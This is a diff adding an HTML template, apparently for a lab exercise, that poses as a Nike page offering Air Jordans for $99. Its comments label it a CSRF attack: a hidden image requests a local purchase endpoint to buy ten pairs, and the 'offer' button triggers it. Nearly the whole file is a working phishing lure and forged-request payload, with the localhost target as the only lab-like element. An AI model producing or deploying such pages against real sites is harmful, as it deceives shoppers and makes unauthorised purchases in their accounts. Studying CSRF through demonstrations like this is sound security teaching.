@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Nike - Oferta Exclusiva</title>
+    <link rel="stylesheet" href="/static/style.css">
+        <link rel="icon" href="{{ url_for('static', filename='favicon.ico') }}" type="image/x-icon">
+</head>
+<body>
+    <div class="container">
+        <header>
+            <img src="{{ url_for('static', filename='nike.png') }}" alt="Mi Logo" class="logo">
+            <h1>¡OFERTA EXCLUSIVA!</h1>
+            <p>Por tiempo limitado, llévate estas Air Jordan 1 por solo <strong>$99</strong> (original $150).</p>
+        </header>
+
+        <div class="shoe">
+            <img src="{{ url_for('static', filename='jordan1.jpg') }}" alt="Mi Producto" class="jordan">
+        </div>
+
+        <!-- Botón que activa el CSRF -->
+        <button id="offer-btn" class="btn">¡QUIERO LA OFERTA!</button>
+
+        <!-- Imagen invisible que hace la petición maliciosa -->
+        <img src="http://localhost:5000/comprar?producto=zapatos&cantidad=10" 
+             width="0" height="0" id="csrf-attack" style="display: none;">
+             
+    </div>
+
+    <script>
+        // Cuando el usuario hace clic, dispara la imagen invisible
+        document.getElementById("offer-btn").addEventListener("click", function() {
+            alert("¡Gracias por tu interés! Redirigiendo...");
+            document.getElementById("csrf-attack").style.display = "block";
+        });
+    </script>
+</body>
+</html>
